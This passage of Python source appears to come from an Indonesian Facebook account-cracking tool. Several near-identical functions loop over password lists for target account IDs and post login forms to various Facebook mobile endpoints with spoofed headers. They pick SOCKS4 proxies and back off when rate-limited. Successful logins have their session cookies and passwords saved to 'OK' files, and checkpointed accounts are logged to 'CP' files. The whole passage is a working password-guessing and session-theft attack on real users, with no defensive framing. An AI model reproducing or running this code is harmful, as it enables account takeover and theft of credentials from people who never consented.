					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1

def cracktrun(idf,pwv,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen8)
	ses = requests.Session()
	prog.update(des,description=f'\r[deep_white]Mobile Trun [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des) 
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.trunkstable.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.trunkstable.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.trunkstable.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.trunkstable.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.trunkstable.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
	
def cracknokia(idf,pwv,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen8)
	ses = requests.Session()
	prog.update(des,description=f'\r[deep_white]Mobile Nokia [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des) 
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://nokia.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'nokia.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.trunkstable.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://nokia.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://nokia.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1


#-------[METHOD MOBILE BY ASEPITGANS]--------#
def crackdate(idf,pwv,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'])
	ses = requests.Session()
	prog.update(des,description=f'\r[deep_white]Mobile [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.prod.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.prod.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
def cradate(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
